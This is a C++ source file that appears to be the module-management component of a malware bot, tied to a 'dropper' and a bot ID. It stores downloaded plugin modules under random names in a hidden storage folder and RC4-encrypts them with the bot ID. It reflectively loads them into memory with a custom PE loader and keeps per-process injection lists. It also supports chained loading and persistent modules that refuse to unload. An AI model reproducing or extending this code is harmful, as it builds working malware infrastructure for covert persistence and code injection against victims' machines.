#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <shlobj.h>

#include "dropper.h"
#include "modules.h"
#include "config.h"
#include "protect.h"

#include "utils.h"
#include "seccfg.h"
#include "peldr.h"
#include "cfgini.h"

// Modules
//----------------------------------------------------------------------------------------------------------------------------------------------------

Modules::DCT_MODULE Modules::DctModules[DCT_MAX_MODULES] = {0};
Modules::DCT_DELAYEDLOAD Modules::DctDelayedLoadModules[DCT_MAX_MODULES] = {0};

VOID Modules::LoadInjectModules(PCHAR Process)
{
	CHAR InjectBuffer[1024] = {0};

	if (Config::ReadString(CFG_DCT_INJECT_SECTION, Process, InjectBuffer, RTL_NUMBER_OF(InjectBuffer)))
	{
		PCHAR Injects = InjectBuffer;
		PCHAR Inject;

		while (Utils::StringTokenBreak(&Injects, ";", &Inject))
		{
			Modules::ModuleLoad(Inject);

			free(Inject);
		}
	}
}

VOID Modules::LoadModulesToProcess(PCHAR Process)
{
	ZeroMemory(DctModules, sizeof(DctModules));
	ZeroMemory(DctDelayedLoadModules, sizeof(DctDelayedLoadModules));
	LoadInjectModules(Process);
	LoadInjectModules("*");
}

BOOLEAN Modules::InjectorAdd(PCHAR InjectOrProcess, PCHAR ModuleName)
{
	CHAR Inject[1024] = {0};

	if (Config::ReadString(CFG_DCT_INJECT_SECTION, InjectOrProcess, Inject, RTL_NUMBER_OF(Inject)))
	{
		if (!StrStrI(Inject, ModuleName))
		{
			lstrcat(Inject, ";");
			lstrcat(Inject, ModuleName);
		}
	}
	else
	{
		lstrcpy(Inject, ModuleName);
	}

	return Config::WriteString(CFG_DCT_INJECT_SECTION, InjectOrProcess, Inject);
}

Modules::PDCT_MODULE Modules::GetModuleByName(PCHAR ModuleName)
{
	PVOID Result = NULL;

	for (DWORD i = 0; i < DCT_MAX_MODULES; i++) if (DctModules[i].ModuleHandle && !_stricmp(DctModules[i].ModuleName, ModuleName)) return &DctModules[i];

	return NULL;
}

Modules::PDCT_MODULE Modules::GetModuleByHandle(PVOID Handle)
{
	PVOID Result = NULL;

	for (DWORD i = 0; i < DCT_MAX_MODULES; i++) if (DctModules[i].ModuleHandle == Handle) return &DctModules[i];

	return NULL;
}

BOOLEAN Modules::WriteModuleAndLoad(PVOID Buffer, DWORD Size, PCHAR ModuleName, DWORD ModuleVersion, PCHAR Inject, PCHAR ConnectedWithModuleName, DWORD RunMode, PCHAR Args)
{
	BOOLEAN Result = FALSE;
	CHAR AppDataPath[MAX_PATH];
	CHAR NewName[MAX_PATH];
	CHAR ModulePath[MAX_PATH];
	PDCT_MODULE DctModule = NULL;

	if (!Config::ReadString(CFG_DCT_MODULES_SECTION, ModuleName, NewName, RTL_NUMBER_OF(NewName))) Utils::GetRandomString(NewName, 15);
	Protect::GetStorageFolderPath(AppDataPath);
	PathCombine(ModulePath, AppDataPath, NewName);
	
	Utils::UtiCryptRc4(Drop::GetBotID(), lstrlen(Drop::GetBotID()), Buffer, Buffer, Size);
	
	if (Result = Utils::FileWrite(ModulePath, CREATE_ALWAYS, Buffer, Size))
	{
		Config::WriteString(CFG_DCT_MODULES_SECTION, ModuleName, NewName);
		Config::WriteString(CFG_DCT_MODCONN_SECTION, ModuleName, ConnectedWithModuleName);
		Config::WriteString(CFG_DCT_MODPARAMS_SECTION, ModuleName, Args);
		Config::WriteInt(CFG_DCT_MODRUNMODE_SECTION, ModuleName, RunMode);
		Config::WriteInt(CFG_DCT_MODVER_SECTION, ModuleName, ModuleVersion);
		Modules::InjectorAdd(Inject, ModuleName);

		Modules::ModuleLoad(ModuleName);
	}
	else
		DbgMsg(__FUNCTION__"(): Can't write file: '%s'\r\n", ModulePath);

	return Result;
}

PVOID Modules::ModuleLoad(PCHAR ModuleName)
{
	DWORD Size;
	PVOID ImageBase;
	PDCT_MODULE DctModule;
	CHAR ModuleParams[MAX_PATH];

	DctModule = GetModuleByName(ModuleName);
	DWORD RunMode = Config::ReadInt(CFG_DCT_MODRUNMODE_SECTION, ModuleName);
	Config::ReadString(CFG_DCT_MODPARAMS_SECTION, ModuleName, ModuleParams, RTL_NUMBER_OF(ModuleParams));
	if (!DctModule)
	{
		CHAR AppDataPath[MAX_PATH];
		CHAR NewName[MAX_PATH];
		CHAR ConnectedWithModuleName[MAX_PATH];

		if (Config::ReadString(CFG_DCT_MODULES_SECTION, ModuleName, NewName, RTL_NUMBER_OF(NewName))
			&& Config::ReadString(CFG_DCT_MODCONN_SECTION, ModuleName, ConnectedWithModuleName, RTL_NUMBER_OF(ConnectedWithModuleName))
			&& CAN_RUN(RunMode))
		{

			PVOID ConnectedModuleBase;
			if (_stricmp(ConnectedWithModuleName, "none") != 0)
			{
				if(!(ConnectedModuleBase = Modules::ModuleLoad(ConnectedWithModuleName)))
				{
					RegisterDelayedModuleLoad(ConnectedWithModuleName, ModuleName);
					return NULL;
				}
			}
			
			if (DctModule = GetModuleByHandle(0))
			{
				Protect::GetStorageFolderPath(AppDataPath);
				PathCombine(DctModule->ModulePath, AppDataPath, NewName);
				DctModule->Version = Config::ReadInt(CFG_DCT_MODVER_SECTION, ModuleName);
				lstrcpyn(DctModule->ModuleName, ModuleName, RTL_NUMBER_OF(DctModule->ModuleName));
			}
		}
	}

	if (DctModule)
	{
		if (!DctModule->ModuleHandle)
		{
			if (ImageBase = Utils::FileRead(DctModule->ModulePath, &Size))
			{
				Utils::UtiCryptRc4(Drop::GetBotID(), lstrlen(Drop::GetBotID()), ImageBase, ImageBase, Size);

				PIMAGE_NT_HEADERS It = PeLdr::PeImageNtHeader(ImageBase), We = PeLdr::PeImageNtHeader(Drop::CurrentImageBase);
				if(!It || !We) {DbgMsg(__FUNCTION__"(): Invalid PE? '%s'\r\n", ModuleName); return 0;}
				BOOLEAN Is32ModIt = It->FileHeader.Machine == IMAGE_FILE_MACHINE_I386;
				BOOLEAN Is32ModWe = We->FileHeader.Machine == IMAGE_FILE_MACHINE_I386;
				if ((Is32ModIt && Is32ModWe) || (!Is32ModIt && !Is32ModWe))
				{
					DbgMsg(__FUNCTION__"(): Trying to load: '%s'\r\n", ModuleName);
					if (DctModule->ModuleHandle = PeLdr::LoadPEImage(ImageBase, Modules::ModulePreprocess, ModuleName, ModuleParams))
					{
						DctModule->load_notify_routine = (IMAGE_LOAD_NOTIFY_ROUTINE)PeLdr::PeGetProcAddress(DctModule->ModuleHandle, "ImageLoadNotifyRoutine");
						if(DctModule->load_notify_routine) {DbgMsg(__FUNCTION__"(): LoadNotifyRoutine registered. address: 0x%X\r\n", DctModule->load_notify_routine);}
						DctModule->unload_notify_routine = (IMAGE_UNLOAD_NOTIFY_ROUTINE)PeLdr::PeGetProcAddress(DctModule->ModuleHandle, "ImageUnloadNotifyRoutine");
						if(DctModule->unload_notify_routine) {DbgMsg(__FUNCTION__"(): UnloadNotifyRoutine registered. address: 0x%X\r\n", DctModule->unload_notify_routine);}

						ModuleLoadNotify(ModuleName, DctModule->ModuleHandle);
						if(RunMode == 1) {Config::WriteInt(CFG_DCT_MODRUNMODE_SECTION, ModuleName, 0);}
						DbgMsg(__FUNCTION__"(): Module: '%s' Loaded\r\n", ModuleName);
					}
				}

				free(ImageBase);
			}
		}
		
		return DctModule->ModuleHandle;
	}
	
	return NULL;
}

BOOLEAN Modules::ModuleUnload(PCHAR ModuleName)
{
	PDCT_MODULE DctModule;
	bool can_module_unload = true;
	bool result = false;
	if (DctModule = GetModuleByName(ModuleName))
	{
		if (DctModule->ModuleHandle)
		{
			for(DWORD i=0; i<DCT_MAX_MODULES; i++) 
			{
				if(DctModules[i].unload_notify_routine != NULL) 
				{
					DWORD ModuleNameNewSize = lstrlen(ModuleName) + 1;
					LPSTR ModuleNameNew = (LPSTR)malloc(ModuleNameNewSize);
					if(ModuleNameNew) CopyMemory(ModuleNameNew, ModuleName, ModuleNameNewSize);

					if(DctModules[i].unload_notify_routine(DctModule->ModuleHandle, ModuleNameNew) == MODULE_IS_PERSISTENT) {can_module_unload = false; DbgMsg(__FUNCTION__"(): Module '%s' is persistent, can't unload.\r\n", ModuleNameNew); break;}
					DbgMsg(__FUNCTION__"(): Module '%s' notified for UNloading 0x%X\r\n", DctModules[i].ModuleName, DctModule->ModuleHandle);

					free(ModuleNameNew);
				}
			}
			if(can_module_unload)
			{
				result = VirtualFree(DctModule->ModuleHandle, 0, MEM_RELEASE);
			}
		}
		
	}
	if(result) {DbgMsg(__FUNCTION__"(): Module '%s' has been unloaded\r\n", DctModule->ModuleName); ZeroMemory(DctModule, sizeof(DCT_MODULE));}
	return result;
}

BOOLEAN Modules::RegisterDelayedModuleLoad(PCHAR WhenLoadsThis, PCHAR LoadMe)
{
	for(DWORD i=0; i<DCT_MAX_MODULES; i++) if(!_stricmp(DctDelayedLoadModules[i].LoadMe, LoadMe) && (DctDelayedLoadModules[i].Waiting == true)) {DbgMsg(__FUNCTION__"(): '%s' already in wait list\r\n", LoadMe); return true;}
	PDCT_DELAYEDLOAD Pointer = NULL;
	for(DWORD i=0; i<DCT_MAX_MODULES; i++) if(DctDelayedLoadModules[i].Waiting == false) {Pointer = &DctDelayedLoadModules[i]; break;}
	if(Pointer)
	{
		Pointer->Waiting = true;
		lstrcpyn(Pointer->LoadMe, LoadMe, RTL_NUMBER_OF(Pointer->LoadMe));
		lstrcpyn(Pointer->WhenLoadsThis, WhenLoadsThis, RTL_NUMBER_OF(Pointer->WhenLoadsThis));
		DbgMsg(__FUNCTION__"(): Wait module registered '%s'\r\n", LoadMe);
		return true;
	}
	return false;
}

void Modules::ModuleLoadNotify(PCHAR WhosLoaded, PVOID module_base)
{
	for(DWORD i=0; i<DCT_MAX_MODULES; i++) 
	{
		if((DctDelayedLoadModules[i].Waiting == true) && (!_stricmp(DctDelayedLoadModules[i].WhenLoadsThis, WhosLoaded))) 
		{
			ModuleLoad(DctDelayedLoadModules[i].LoadMe);
			ZeroMemory(&DctDelayedLoadModules[i], sizeof(Modules::DCT_DELAYEDLOAD));
		}
	}
}

void Modules::ModulePreprocess(PVOID pe_image_base, LPSTR module_name, LPSTR params)
{
	for(DWORD i=0; i<DCT_MAX_MODULES; i++) 
	{
		if(DctModules[i].load_notify_routine != NULL) 
		{
			DWORD ModuleNameSize = lstrlen(module_name) + 1;
			LPSTR ModuleName = (LPSTR)malloc(ModuleNameSize);
			if(ModuleName) CopyMemory(ModuleName, module_name, ModuleNameSize);

			DWORD ParamsSize = lstrlen(params) + 1;
			LPSTR Params = (LPSTR)malloc(ParamsSize);
			if(Params) CopyMemory(Params, params, ParamsSize);

			DbgMsg(__FUNCTION__"(): notifying module '%s' about loading of module '%s'\r\n", DctModules[i].ModuleName, ModuleName);
			DWORD result = DctModules[i].load_notify_routine(pe_image_base, ModuleName, Params);
			DbgMsg(__FUNCTION__"(): Module '%s' notified for loading 0x%X, result: 0x%X\r\n", DctModules[i].ModuleName, pe_image_base, result);

			free(Params);
			free(ModuleName);
		}
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------
